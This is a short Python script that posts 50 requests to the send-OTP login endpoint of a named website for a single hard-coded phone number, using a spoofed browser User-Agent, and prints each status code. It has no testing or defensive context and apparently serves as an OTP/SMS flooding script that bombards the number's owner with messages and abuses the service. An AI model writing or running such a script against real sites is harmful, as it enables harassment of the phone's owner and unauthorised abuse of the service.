import requests

URL = "http://servedoor.com/user/login/send-otp"

headers = {
"Content-Type": "application/json",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"
}

for i in range(50):
    r = requests.post(URL, json={"mobile":"9876543210"}, headers=headers)
    print(i+1, r.status_code)



